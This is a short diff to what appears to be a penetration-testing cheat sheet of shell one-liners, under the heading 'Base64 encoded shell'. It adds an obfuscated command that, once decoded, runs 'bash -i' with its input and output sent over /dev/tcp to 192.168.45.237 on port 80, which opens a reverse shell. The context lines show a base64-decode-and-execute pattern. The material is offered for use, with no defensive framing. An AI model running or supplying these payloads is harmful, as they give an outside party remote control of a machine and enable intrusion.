@@ -22,6 +22,7 @@ Base64 encoded shell
 
     base64 revshell.sh
     echo "BASE64_SHELL" |base64 -d | bash
+    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNy84MCAwPiYx}|{base64,-d}|{bash,-i}
 
 Curl shell from remote server
 
